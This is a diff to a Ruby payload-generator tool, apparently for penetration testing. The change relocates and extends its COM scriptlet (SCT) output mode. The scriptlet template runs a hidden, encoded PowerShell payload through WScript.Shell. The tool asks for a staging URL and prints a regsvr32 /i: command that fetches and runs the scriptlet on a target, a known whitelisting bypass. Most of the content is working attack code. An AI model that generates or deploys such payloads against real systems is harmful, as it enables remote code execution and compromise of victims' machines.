@@ -21,8 +21,8 @@
 # => hta (HTML applications)
 # => cfm (for use with Adobe ColdFusion)
 # => aspx (for use with ASP.NET)
-# => lnk (windows shortcut - requires a website to stage the payload)
-#
+# => lnk (windows shortcut - requires a webserver to stage the payload)
+# => sct (COM scriptlet - requires a webserver to stage the payload)
 #
 #    Powershell code based on PowerSploit written by Matthew Graeber and SET by Dave Kennedy
 #     DETAILS:
@@ -57,7 +57,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, php, hta, cfm, aspx, lnk") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, php, hta, cfm, aspx, lnk, sct") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -338,59 +338,6 @@ puts jsTEMPLATE
 
 end
 
-########################SCT_ENCODE##############################
-if $lencode == "sct"
-
-powershell_encoded = gen_PS_shellcode()
-
-sctTEMPLATE = %{<?XML version="1.0"?>
-<scriptlet>
-
-<registration
-    description="notEmail"
-    progid="notEmail"
-    version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-    >
-    <!-- Based on work by Casey Smith @subTee -->
-    
-    <!-- regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll
-    <!-- DFIR -->
-    <!--        .sct files are downloaded and executed from a path like this -->
-    <!-- Though, the name and extension are arbitary.. -->
-    <!-- Based on current research, no registry keys are written, since call "uninstall" -->
-    
-    
-    <script language="JScript">
-        <![CDATA[
-        
-            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}");
-    
-        ]]>
-    </script>
-</registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-<script language="JScript">
-<![CDATA[
-    
-    function Exec()
-    {
-        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
-    }
-    
-]]>
-</script>
-
-</scriptlet>}
-
-File.write( 'index.sct', sctTEMPLATE) 
-puts "File: index.sct created\nUsage:\"regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll\" on the target"
-
-end
-
 ######################PHP_ENCODE###############################
 if $lencode == "php"
 
@@ -517,3 +464,69 @@ puts "-------------copy the below code and host it on #{stageURL}--------------"
 puts "powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
 
 end
+
+########################SCT_ENCODE##############################
+if $lencode == "sct"
+
+powershell_encoded = gen_PS_shellcode()
+
+
+stageURL = String.new
+
+puts "This encoding format requires staging"
+puts "Enter the full URL on which the payload will be hosted:"
+stageURL = gets.chomp!
+
+
+sctTEMPLATE = %{<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="notEmail"
+    progid="notEmail"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    >
+    <!-- Based on work by Casey Smith @subTee -->
+    
+    <!-- regsvr32 /s /n /u /i:https://example.com/index.sct scrobj.dll
+    <!-- DFIR -->
+    <!--        .sct files are downloaded and executed from a path like this -->
+    <!-- Though, the name and extension are arbitary.. -->
+    <!-- Based on current research, no registry keys are written, since call "uninstall" -->
+    
+    
+    <script language="JScript">
+        <![CDATA[
+        
+            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}");
+    
+        ]]>
+    </script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+    
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+    }
+    
+]]>
+</script>
+
+</scriptlet>}
+
+File.write( 'index.sct', sctTEMPLATE) 
+puts "Payload created! - index.sct\n\n"
+
+
+puts "-------------copy the index.sct and host it on #{stageURL}--------------"
+puts "To run, execute the following on the target system:\n\"regsvr32 /s /n /u /i:#{stageURL}/index.sct scrobj.dll\""
+
+end
+
